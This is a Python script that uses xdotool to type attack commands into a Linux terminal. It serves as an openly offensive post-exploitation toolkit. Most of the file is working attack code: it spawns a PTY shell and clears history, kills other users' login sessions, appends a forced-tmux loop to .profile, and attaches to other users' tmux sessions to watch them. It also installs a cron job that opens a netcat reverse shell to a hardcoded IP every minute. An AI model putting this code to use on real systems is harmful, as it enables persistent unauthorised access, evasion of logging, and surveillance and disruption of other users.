import argparse
import sys
import subprocess
from time import sleep
import pyautogui
import os
my_ip = "136.243.108.184"
# Define command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--bs", action='store_true', help="beautiful shell" )
parser.add_argument("--kick", help="Kick other pts sessions, use -1 to kick all other sessions, specify the number you want to kick example pts/2 execute --kick 2", type=int, default=-2)
parser.add_argument("--ts", action='store_true', help="tmux setup, make every login start a tmux session by default", )
parser.add_argument("--ats", action='store_true', help="Attach to latest tmux session, watch other people :D", )
parser.add_argument("--ic", help="Install crontab, to automatically connect to your ip, IP hardcoded in script, port needs to be specified", type=str , default=-1)

# Parse command-line arguments
args = parser.parse_args()

def write(text):
    # use subprocess and xdotool to write text
    subprocess.run(["xdotool", "type", "--delay", "0", text])

def press(key):
    # use subprocess and xdotool to press key
    subprocess.run(["xdotool", "key", key])
# Check if command is "bs"
sleep(2)
kick_value = args.kick
if args.bs:
    write("python3 -c 'import pty; pty.spawn(\"/bin/bash\")' && history -c")

if args.kick != -2:
    if args.kick == -1: 
        write("w | awk '{print($2)}' | grep pts > active_sessions")
        press("Return")
        write("ps -efH | grep $$ | grep bash | grep -v grep | awk '{print($6)}' > my_session")
        press("Return")
        write("grep -v -x -f my_session active_sessions | awk '{system(\"ps -efH | grep \" $1)}' | grep -v grep | awk '{system(\"kill \" $2)}'")
        press("Return")
        write("rm my_session")
        press("Return")
        write("rm active_sessions")
        press("Return")
        write("tmux kill-server")
        press("Return")
        write("history -c")
        press("Return")
    elif args.kick > -1:
        write(f'ps -efH | grep pts/{kick_value}' + ' | awk \'{system("kill " $2)}\' && history -c')

if args.ts:
   #!/bin/bash
    write("sudo apt install tmux -y")
    press("Return")
    sleep(10)
    write("echo 'isTmux=0' >> .profile")
    press("Return")
    write("echo 'iKnow=0' >> .profile")
    press("Return")
    write("echo 'i=0' >> .profile")
    press("Return")
    write("echo 'while [ $iKnow -lt 1 ] && [ $isTmux -lt 1 ]' >> .profile")
    press("Return")
    write("echo 'do ' >> .profile")
    press("Return")
    write("echo '   iKnow=$(ps -efH | grep $$ -B $i | grep sshd | grep -v grep | wc -l)' >> .profile")
    press("Return")
    write("echo '   isTmux=$(ps -efH | grep $$ -B $i | grep tmux | grep -v grep | wc -l)' >> .profile")
    press("Return")
    write("echo '   i=$((i+1))' >> .profile")
    press("Return")
    write("echo 'done' >> .profile")
    press("Return")
    write("echo 'if [ $isTmux -lt 1 ]' >> .profile")
    press("Return")
    write("echo 'then' >> .profile")
    press("Return")
    write("echo '   tmux' >> .profile")
    press("Return")
    write("echo 'fi' >> .profile && history -c")
    press("Return")

if args.ats:
    write("tmux attach-session -t $(tmux list-sessions | grep attached | grep -v '0 windows' | awk '{print $1}' | cut -d ':' -f 1 | tail -n 1)")
    press("Return")

if args.ic != -1:
    write("echo \"* * * * * /usr/bin/nc " + my_ip + " " + args.ic + " -e /bin/bash\" >> .crontab_d")
    press("Return")
    write("crontab .crontab_d")
    press("Return")
    write("crontab -l")
    press("Return")
    write("history -c")
    press("Return")

if len(sys.argv)==1:
    parser.print_help()